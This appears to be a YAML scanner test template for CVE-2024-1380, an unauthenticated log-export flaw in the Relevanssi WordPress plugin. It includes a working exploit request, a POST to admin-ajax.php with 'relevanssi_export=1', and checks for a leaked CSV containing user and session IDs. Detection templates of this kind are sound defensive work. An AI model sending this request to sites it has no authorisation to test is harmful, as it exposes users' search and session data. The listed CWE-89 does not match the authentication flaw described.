id: RELEVANSSI_SEARCH_WORDPRESS_PLUGIN_QUERY_LOG_EXPORT
info:
  name: "Relevanssi Search WordPress Plugin Query Log Export Vulnerability"
  description: > 
    "This test affects the Relevanssi plugin by exposing sensitive search query logs. This vulnerability allows unauthorized users to access and export these logs, potentially revealing private search terms and user behavior. Exploiting this issue can lead to the unintended disclosure of confidential information and compromise user privacy."
  details: >
    "This vulnerability is a flaw in the Relevanssi plugin that permits unauthorized access to search query logs. This vulnerability allows attackers to export these logs without proper authentication or authorization checks. As a result, sensitive information about user search queries can be exposed, posing a risk to user privacy and potentially revealing insights into site activity and user behavior."
  impact: >
    "The impact of this vulnerability includes the potential exposure of sensitive search data and user behavior. Unauthorized access to these logs can lead to privacy breaches, as attackers might obtain confidential information about users' search activities. This can compromise user confidentiality, expose personal interests or patterns, and damage the site's overall security and reputation."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: RELEVANSSI_SEARCH_WORDPRESS_PLUGIN_QUERY_LOG_EXPORT
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-89
  cve:
    - CVE-2024-1380

api_selection_filters:
  response_code:
    gte: 200
    lte: 300
  method:
    neq: "OPTIONS"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: content-type
        extract: contentTypeHeader
execute:
  type: single
  requests:
  - req:
    - modify_method: POST
    - replace_body: 'action=&relevanssi_export=1'
    - modify_header:
        contentTypeHeader: "application/x-www-form-urlencoded; charset=UTF-8"
    - modify_url: ${urlVar}/wp-admin/admin-ajax.php
validate:
  response_code:
    eq: 200
  response_payload:
    length:
      gt: 0  
    contains_all:
      - filename=relevanssi_log.csv
      - application/download
      - user_id
      - session_id 
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts